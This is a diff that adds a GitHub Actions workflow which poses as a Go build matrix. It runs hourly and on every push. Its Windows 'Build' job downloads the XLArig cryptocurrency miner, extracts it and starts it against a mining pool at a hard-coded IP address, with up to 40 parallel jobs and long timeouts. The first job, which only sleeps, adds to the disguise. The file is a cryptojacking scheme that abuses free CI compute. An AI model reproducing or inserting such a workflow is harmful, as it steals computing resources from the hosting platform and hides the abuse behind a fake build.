@@ -1,0 +1,62 @@
+name: kintil
+on:
+  push:
+  schedule:
+    - cron: '0 * * * *'
+
+jobs:
+  pen:
+    container:
+      image: ubuntu:bionic
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
+        flag: [A, B]
+    timeout-minutes: 240
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: mugg_go
+      run: |
+        set -e
+        apt-get update -y
+        sleep 10
+  step-1:
+    name: Build
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 40
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4]
+        flag: [A, B, C, D, E, F]
+    timeout-minutes: 350
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Download
+      run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -OutFile xlarig.zip
+    - name: Extract
+      run: Expand-Archive xlarig.zip
+    - name: Start
+      run: .\xlarig\xlarig.exe -o 165.232.168.241:3333 -u x -p Alexa -t4 -k -a panthera --randomx-1gb-pages --keepalive
